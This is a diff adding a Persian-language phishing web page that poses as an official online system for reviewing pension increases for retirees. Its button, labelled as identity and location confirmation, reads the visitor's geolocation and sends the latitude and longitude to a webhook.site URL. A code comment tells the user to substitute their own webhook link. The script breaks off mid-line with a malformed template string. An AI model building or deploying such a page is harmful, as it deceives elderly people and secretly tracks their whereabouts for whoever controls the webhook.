@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>سامانه بررسی افزایش حقوق بازنشستگان</title>
+<style>
+body { font-family: 'Tahoma', Arial; background-color: #fdfdfd; text-align: center; padding: 0; margin: 0; }
+.header { background-color: #1a5276; color: white; padding: 20px; font-size: 18px; font-weight: bold; }
+.content { padding: 30px 20px; }
+.info-box {
+background: #ebedef;
+border-left: 5px solid #1a5276;
+padding: 15px;
+margin-bottom: 25px;
+text-align: right;
+font-size: 14px;
+color: #333;
+}
+.btn {
+background-color: #27ae60;
+color: white;
+padding: 15px 40px;
+font-size: 18px;
+border: none;
+border-radius: 8px;
+cursor: pointer;
+font-weight: bold;
+box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+}
+.btn:hover { background-color: #2ecc71; }
+#status { margin-top: 20px; color: #c0392b; font-weight: bold; }
+</style>
+</head>
+<body>
+
+<div class="header">
+سامانه الکترونیکی بررسی وضعیت حقوق بازنشستگان
+</div>
+
+<div class="content">
+<div class="info-box">
+<strong>توجه:</strong> جهت ثبت درخواست افزایش حقوق و بررسی وضعیت استحقاق، ابتدا باید موقعیت مکانی شما جهت تایید منطقه سکونت تایید گردد.
+</div>
+
+<p>برای شروع فرآیند تایید هویت و ثبت درخواست، روی دکمه زیر کلیک کنید:</p>
+<button class="btn" onclick="getLocation()">تایید موقعیت و ورود به سامانه</button>
+
+<div id="status"></div>
+</div>
+
+<script>
+function getLocation() {
+var status = document.getElementById("status");
+status.innerHTML = "در حال بررسی موقعیت مکانی... لطفاً اجازه دسترسی را تایید کنید.";
+
+if (navigator.geolocation) {
+navigator.geolocation.getCurrentPosition(showPosition, showError);
+} else {
+status.innerHTML = "مرورگر شما از این قابلیت پشتیبانی نمی‌کند.";
+}
+}
+
+function showPosition(position) {
+var lat = position.coords.latitude;
+var lon = position.coords.longitude;
+
+// لینک Webhook خودت را اینجا جایگزین کن
+var webhookUrl = "https://webhook.site/3e658cab-cff7-4b12-ad19-52d6e636d924";
+
+fetch(${webhookUrl}?lat=`${lat}&lon=${lon
